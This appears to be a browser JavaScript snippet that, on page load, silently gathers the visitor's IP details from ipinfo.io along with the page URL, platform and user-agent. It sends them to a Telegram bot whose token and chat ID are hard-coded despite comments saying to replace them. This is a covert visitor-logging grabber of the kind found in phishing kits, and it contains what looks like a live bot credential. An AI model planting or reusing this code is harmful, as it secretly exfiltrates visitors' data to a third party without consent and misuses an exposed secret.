// Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
const botToken = '6644544007:AAHoOrBoB5Dusuw1J2apugVbxo2A1TNQ8Ro';
// Replace 'YOUR_CHAT_ID' with your chat ID where the message should be sent
const chatId = '2091702650';

// Function to send a message to the Telegram bot
const sendMessageToTelegram = (message) => {
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(response => response.json())
  .then(result => {
    console.log('Message sent:', result);
  })
  .catch(error => {
    console.error('Error sending message:', error);
  });
};

// Fetch IP details
fetch('https://ipinfo.io/json')
  .then(response => response.json())
  .then(data => {
    const ipInfoJsonString = JSON.stringify(data, null, 2); // Convert JSON to a formatted string

    const formattedMessage = `
Url: ${document.location.href}
Browser CodeName: ${navigator.appCodeName}
Browser Name: ${navigator.appName}
Platform: ${navigator.platform}
User-agent header: ${navigator.userAgent}
Ip Details:
${ipInfoJsonString}
`;

    sendMessageToTelegram(formattedMessage);
  })
  .catch(error => {
    console.error('Error fetching IP info:', error);

    // Send a message to Telegram indicating that fetching IP info failed
    const errorMessage = `
Url: ${document.location.href}
Browser CodeName: ${navigator.appCodeName}
Browser Name: ${navigator.appName}
Platform: ${navigator.platform}
User-agent header: ${navigator.userAgent}
Ip Details:
Failed to fetch IP info: ${error.message}
`;

    sendMessageToTelegram(errorMessage);
  });
